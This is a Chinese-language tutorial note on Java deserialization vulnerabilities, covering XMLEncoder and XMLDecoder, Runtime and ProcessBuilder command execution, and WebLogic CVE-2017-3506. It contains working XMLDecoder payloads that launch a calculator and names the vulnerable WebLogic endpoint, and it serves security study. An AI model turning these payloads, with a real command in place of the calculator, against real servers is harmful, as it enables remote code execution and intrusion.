## 序列化与反序列化

* Java序列化和反序列化的代码原理以及工作流程
* Java反序列化漏洞的形成原因
* Java反序列化漏洞的挖掘思路

序列化是将Java对象转换成字节流的过程, 而反序列化是将字节流转换成Java对象的过程

序列化和反序列化的目的是为了更方便进行数据和对象的存储, 网络传输

### 序列化原因

* 内存中存在大量的对象, 会让内存负担过重, 像session对象, 如果有数以万计用户并发访问, 那就会同样出现数以万计的 session对象, 这时Web应用会将一些session先序列化存储在硬盘中, 等需要使用的时候, 再将其反序列化, 还原到内存中, 节约计算机内存资源

* 在进行远程过程调用时, 需要在网络上传输 JavaBean 的对象, 而网络上只允许二进制形式的数据进行传输, 这算是需要用到序列化技术

### XMLEncoder

#### encoder

```java
import java.beans.XMLEncoder;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;

public class encoder {

  public static void main(String[] args) throws IOException, InterruptedException {

    HashMap<String, Object> map = new HashMap<>();  //创建HashMap散列集
    map.put("name", "Rookie");  //key Name 放入字符串
    map.put("LV", 1);  //key LV 放入数值

    ArrayList<String> arrayList = new ArrayList<String>();
    arrayList.add("Sword");
    arrayList.add("Shield");
    map.put("Equipment", arrayList);  //key Equipment 放入可动态修改的数组

    System.out.println("map = " + map);  //map = {Equipment=[Sword, Shield], LV=1, Name=Rookie}

    XMLEncoder xmlEncoder = new XMLEncoder(System.out);
    xmlEncoder.writeObject(map);  //实例化 XMLEncoder 对象并将 map 散列集序列化编码

    xmlEncoder.close();
  }
}
```

#### decoder

```java
import java.beans.XMLDecoder;
import java.io.IOException;
import java.io.StringBufferInputStream;

import javax.sql.rowset.spi.XmlReader;

public class decoder {

  public static void main(String[] args) throws IOException, InterruptedException {
    String s = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        + "<java version=\"11.0.13\" class=\"java.beans.XMLDecoder\">\n" + "<Object class=\"java.util.HashMap\">\n"
        + "<void method=\"put\">\n" + "<string>Equipment</string>\n" + "<object class=\"java.util.ArrayList\">\n"
        + "<void method=\"add\">\n" + "<string>Sword</string>\n" + "</void>\n" + "<void method=\"add\">\n"
        + "<string>Shield</string>\n" + "</void>\n" + "</object>\n" + "</void>\n" + "<void method=\"put\">\n"
        + "<string>LV</string>\n" + "<int>1</int>\n" + "</void>\n" + "<void method=\"put\">\n"
        + "<string>Name</string>\n" + "<string>Rookie</string>\n" + "</void>\n" + "</object>\n" + "</java>";
    StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(s);
    XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream);
    Object o = xmlDecoder.readObject();
    System.out.println(o);

  }
}
```

#### decoder_mod

```java
import java.beans.XMLDecoder;
import java.io.IOException;
import java.io.StringBufferInputStream;

import javax.sql.rowset.spi.XmlReader;

public class decoder {

  public static void main(String[] args) throws IOException, InterruptedException {
    String s = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        + "<java version=\"11.0.13\" class=\"java.beans.XMLDecoder\">\n" + "<Object class=\"java.util.HashMap\">\n"
        + "<array class=\"java.lang.String\" length=\"1\">\n" + "<void index=\"0\"><string>calc</string></void>\n"
        + "</array>\n" + "<void method=\"start\">\n" + "</void>\n" + "</object>\n" + "</java>";
    StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(s);
    XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream);
    Object o = xmlDecoder.readObject();
    System.out.println(o);

  }
}
```

### 反序列化原理

Java应用对用户输入没有任何过滤, 即不可信数据做了反序列化处理, 攻击者可以通过构造恶意输入, 让反序列化产生非预期的对象, 就有可能造成任意代码执行

### 反序列化漏洞挖掘

* 反序列化漏洞多使用白盒审计方法来挖掘, 黑盒挖掘难度过高
* 在代码中搜索某些高危函数, 如 XMLDecoder.readObject, Yaml.load, XStream.fromXML 等, 确定了反序列化输入点后, 再观察应用的 ClassPath 中是否包含 ApacheCommons Collections 等危险库
* 若包含危险库, 则使用 **ysoserial** 等开源工具进行攻击复现
* 若不包含危险库, 则查看一些涉及命令, 代码执行的代码区域, 防止因代码不严谨, 导致反序列化漏洞的产生
* 查看高危函数的输入点是否可控

## Java系统命令执行

* Java中的Runtime类和ProcessBuilder类的作用
* 使用Java代码编写执行系统命令的java文件

### 调用系统计算器

#### java.lang.Runtime

```java
//常规写法
Runtime runtime = Runtime.getRuntime();
runtime.exec("open /Applications/Calculator.app");

//Java自带的类
java.lang.Runtime runtime = java.lang.Runtime.getRuntime();
runtime.exec(new String[]{"/bin/bash", "-c", "open -a Calculator"});

//带回显的命令行
Runtime runtime = Runtime.getRuntime();
Process start = runtime.exec("ip a");
InputStream inputStream = start.getInputStream();
byte[] res = new byte[1024];
inputStream.read(res);
System.out.println(new Sting(res));
```

#### java.lang.ProcessBuilder

```java
//Java 极简写法
new ProcessBuilder("/bin/bash", "-c", "open -a Calculator").start();

//Java 自带的类
new java.lang.ProcessBuilder(new String[]{"/bin/bash", "-c", "open -a Calculator"}).start();

//标准写法
ProcessBuilder processBuilder = new ProcessBuilder("/bin/bash", "-c", "open -a Calculator");
Process start = processBuilder.start();
```

#### Windows

* `calc`    调用计算器
* `cmd /c calc`    通过CMD命令调用calc, 执行完成后关闭命令行窗口
* `cmd /k calc`    通过CMD命令调用calc, 执行完后不不关闭命令行窗口

```java
import java.io.IOException;

public class runtime {
  public static void main(String[] args) throws IOException {
    Runtime runtime = Runtime.getRuntime();
    runtime.exec("calc");
    System.out.println(runtime);
  }
}
```

#### MacOS

二进制程序的执行位置

```
/Applications/Calculator.app/Contents/MacOS/Calculator

open /Applications/Calculator.app
```

不同版本位置可能不同

```
/System/Applications/Calculator.app/Contents/MacOS/Calculator

open /System/Applications/Calculator.app
```

使用 bash 调用 open -a Calculator 命令

```
bash -c open -a Calculator

/bin/bash -c open -a Calculator
```

## 反序列化Payload构造

### XML 单参数 Payload 构造

``` java
new java.lang.ProcessBuilder("/Applications/Calculator.app/Contents/MacOS/Calculator").start()
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_261" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="1">
      <void index="0">
        <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>
      </void>
    </array>
    <void method="start"></void>
  </object>
</java>
```

### XML 多参数 Payload 构造

```java
new ProcessBuilder("/bin/bash", "-c", "open -a Calculator").start();
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_261" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0">
        <string>/bin/bash</string>
      </void>
      <void index="1">
        <string>c</string>
      </void>
      <void index="2">
        <string>open -a Calculator</string>
      </void>
    </array>
    <void method="start"></void>
  </object>
</java>
```

## Weblogic反序列化漏洞分析

### CVE-2017-3506 漏洞简介

![image-20211224095543183](https://cdn.jsdelivr.net/gh/yzbtdiy/images@security/web/java_deserialization/image-20211224095543183.png)

* 影响版本: Weblogic 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1, 12.2.1.2
* 漏洞位置: wls-wsat.war
* 漏洞 URL: /wls-wsat/CoordinatorPortType (POST)
* 漏洞本质: 构造 SOAP (XML) 格式的请求, 在解析的过程中导致 XMLDecoder 反序列化漏洞

使用 JD-GUI 反编译 jar/root/Oracle/Middleware/wlserver_10.3/lib/weblogic.jar

weblogic.wess.jaxws.workcontent.WorkContextServerTube

```java
public NextAction processRequest(Packet paramPacket) {
  this.isUseOldFormat = false;
  if (paramPacket.getMessage() != null) {
    HeaderList headerList = paramPacket.getMessage().getHeaders();
    Header header1 = headerList.get(WorkAreaConstants.WORK_AREA_HEADER, true);
    if (header1 != null) {
      readHeaderOld(header1);
      this.isUseOldFormat = true;
    }
    Header header2 = headerList.get(this.JAX_WS_WORK_AREA_HEADER, true);
    if (header2 != null) {
      readHeader(header2);
    }
    return super.processRequest(paramPacket);
  }
}
```



* Weblogic反序列化漏洞的基本原理
* 使用EXP和自动化集成工具进行Weblogic反序列化漏洞的漏洞利用
* Weblogic反序列化漏洞的更新补丁和绕过原理

## 反序列化实战中的利用方法

* Weblogic CVE-2019-2725漏洞的形成原因
* 使用EXP和自动化集成工具进行 CVE-2019-2725漏洞的利用
* Apache Shiro 1.2.4 反序列化漏洞的形成原因
* 使用自动化集成工具进行Shiro反序列化漏洞的利用
* Jboss反序列化漏洞的形成原因
* 使用脚本和自动化集成工具进行Jboss反序列化漏洞的漏洞利用